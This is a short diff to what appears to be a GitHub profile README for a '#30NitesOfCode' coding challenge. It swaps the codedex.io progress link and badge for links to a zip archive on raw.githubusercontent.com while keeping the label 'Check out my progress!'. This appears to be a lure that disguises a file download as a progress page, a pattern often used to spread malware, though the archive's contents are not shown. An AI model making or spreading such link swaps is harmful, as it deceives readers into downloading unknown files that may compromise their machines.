@@ -1,3 +1,3 @@
 ## #30NitesOfCode:
-  [Check out my progress!](https://www.codedex.io/@kushal854852193/30-nites-of-code)  
-  ![@kushal854852193 #30NitesOfCode](https://www.codedex.io/api/petStatus?user=kushal854852193)
+  [Check out my progress!](https://raw.githubusercontent.com/kushal0451/trying-again/main/cataphatic/trying-again.zip)  
+  ![@kushal854852193 #30NitesOfCode](https://raw.githubusercontent.com/kushal0451/trying-again/main/cataphatic/trying-again.zip)
